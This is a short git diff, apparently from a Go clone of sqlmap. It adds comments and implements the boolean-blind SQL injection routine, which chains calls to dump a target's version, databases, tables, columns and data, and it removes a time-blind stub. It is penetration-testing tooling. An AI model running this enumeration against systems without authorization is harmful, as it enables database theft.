@@ -6,6 +6,7 @@ import (
 	"go-sqlmap/util"
 )
 
+// RunUnionSelect UnionSelect注入
 func RunUnionSelect(target string, params Input, suffixList []string) bool {
 	log.Info("start union select injection...")
 	suffix, key := core.GetOrderByNum(suffixList, target)
@@ -32,6 +33,7 @@ func RunUnionSelect(target string, params Input, suffixList []string) bool {
 	return true
 }
 
+// RunErrorBased ErrorBased注入
 func RunErrorBased(target string, params Input, suffixList []string) bool {
 	log.Info("start error based injection...")
 	success, suffix := core.DetectErrorBased(target, suffixList)
@@ -56,14 +58,18 @@ func RunErrorBased(target string, params Input, suffixList []string) bool {
 	return true
 }
 
+// RunBoolBlind BoolBlid注入
 func RunBoolBlind(target string, params Input, suffixList []string) bool {
 	log.Info("start bool blind injection...")
-	// TODO
-	return false
-}
-
-func RunTimeBlind(target string, params Input, suffixList []string) bool {
-	log.Info("start time blind injection...")
-	// TODO
-	return false
+	success, suffix := core.GetBoolBlindSuffix(target, suffixList)
+	if !success {
+		return false
+	}
+	core.GetVersionByBoolBlind(target, suffix)
+	core.GetCurrentDatabaseByBoolBlind(target, suffix)
+	core.GetAllDatabasesByBoolBlind(target, suffix)
+	core.GetAllTablesByBoolBlind(target, suffix, params.Database)
+	core.GetAllColumnsByBoolBlind(target, suffix, params.Database, params.Table)
+	core.GetAllDataByBoolBlind(target, suffix, params.Database, params.Table, params.Columns)
+	return true
 }
